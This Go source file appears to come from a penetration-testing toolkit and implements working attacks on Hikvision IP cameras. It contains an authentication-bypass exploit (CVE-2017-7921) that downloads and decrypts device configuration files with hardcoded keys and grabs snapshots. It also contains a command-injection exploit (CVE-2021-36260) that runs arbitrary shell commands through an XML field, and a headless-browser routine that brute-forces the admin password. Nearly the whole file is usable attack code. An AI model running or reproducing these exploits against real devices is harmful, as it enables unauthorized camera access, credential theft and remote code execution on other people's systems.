package hikvision

import (
	"bytes"
	"context"
	"crypto/aes"
	"encoding/hex"
	"errors"
	"fmt"
	"net/http"
	"regexp"
	"slack-wails/lib/clients"
	"slack-wails/lib/gologger"
	"strings"
	"time"

	"github.com/chromedp/chromedp"
)

// ZeroPadding pads byte array to block size with zero
func ZeroPadding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{0}, padding)
	return append(data, padText...)
}

// ZeroUnPadding removes zero padding
func ZeroUnPadding(data []byte) ([]byte, error) {
	padding := 0
	length := len(data)
	if length == 0 {
		return nil, errors.New("cannot remove padding for zero length byte array")
	}
	for i := length - 1; i >= 0; i-- {
		// byte is same to int8, stands for ascii code
		if data[i] == 0 {
			padding++
		} else {
			break
		}
	}
	return data[:length-padding], nil
}

func AesDecrypt(cipherText []byte, key []byte) []byte {
	// create an AES instance
	block, _ := aes.NewCipher(key)
	blockSize := block.BlockSize()
	cipherText = ZeroPadding(cipherText, blockSize)
	plainByte := make([]byte, len(cipherText))
	for bs, be := 0, blockSize; bs < len(cipherText); bs, be = bs+blockSize, be+blockSize {
		block.Decrypt(plainByte[bs:be], cipherText[bs:be])
	}

	plainByte, _ = ZeroUnPadding(plainByte)
	return plainByte
}

func xore(data []byte, key []byte) []byte {
	var result []byte
	for i := 0; i < len(data); i++ {
		result = append(result, data[i]^key[i%len(key)])
	}
	return result
}

func FilterStrings(data string) []string {
	printableChars := `A-Za-z0-9/\-:.,_$%'()[\]<> `
	shortestReturnChar := 2
	regExp := fmt.Sprintf("[%s]{%d,}", printableChars, shortestReturnChar)
	pattern := regexp.MustCompile(regExp)
	return pattern.FindAllString(data, -1)
}

func CVE_2017_7921_Config(url string, client *http.Client) string {
	_, body, err := clients.NewSimpleGetRequest(url+"/System/configurationFile?auth=YWRtaW46MTEK", client)
	if err != nil {
		return err.Error()
	}
	key, _ := hex.DecodeString("279977f62f6cfd2d91cd75b889ce0c9a")
	xorKey := []byte{0x73, 0x8B, 0x55, 0x44}
	decrypted := AesDecrypt(body, key)
	resultList := FilterStrings(string(xore(decrypted, xorKey)))
	return strings.Join(resultList, "  ")
}

func CVE_2017_7921_Snapshot(url string, client *http.Client) []byte {
	_, body, err := clients.NewSimpleGetRequest(url+"/onvif-http/snapshot?auth=YWRtaW46MTEK", client)
	if err != nil {
		return []byte{}
	}
	return body
}

func CVE_2021_36260(url, cmd string, client *http.Client) string {
	h := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	}
	body := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><language>$(%s>webLib/x)</language>`, cmd)
	resp, _, err := clients.NewRequest("PUT", url+"SDK/webLanguage", h, strings.NewReader(body), 10, false, client)
	if err != nil {
		return err.Error()
	}
	if resp.StatusCode == 200 {
		_, content, err := clients.NewSimpleGetRequest(url+"x", client)
		if err != nil {
			return err.Error()
		}
		return string(content)
	}
	return "[-] 不存在CVE-2021-36260"
}

// 弱口令检测
func CameraHandlessLogin(appCtx context.Context, url string, password []string) string {
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-background-timer-throttling", false),
	)

	allocatorCtx, chromedpCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer chromedpCancel()

	ctx, cancel := chromedp.NewContext(allocatorCtx)
	defer cancel()

	for _, pass := range password {
		// 设置上下文超时
		ctx, cancel = context.WithTimeout(ctx, time.Second*10)
		defer cancel()

		var res string
		err := chromedp.Run(ctx,
			chromedp.Navigate(url),
			chromedp.SendKeys(`//*[@id="username"]`, "admin"),
			chromedp.SendKeys(`//*[@id="password"]`, pass),
			chromedp.Click(`//*[@id="login"]/table/tbody/tr/td[2]/div/div[5]/button`),
			chromedp.Location(&res),
		)
		if err != nil {
			return fmt.Sprintf("[-] %s  %v\n", url, err)
		}
		if strings.Contains(res, "doc/page/login.asp") {
			gologger.Info(appCtx, fmt.Sprintf("[hivision] %s admin:%s login failed", url, pass))
		} else {
			return fmt.Sprintf("[+] %s admin:%s login success!!\n", url, pass)
		}
	}
	return fmt.Sprintf("[-] %s all password was login failed\n", url)
}
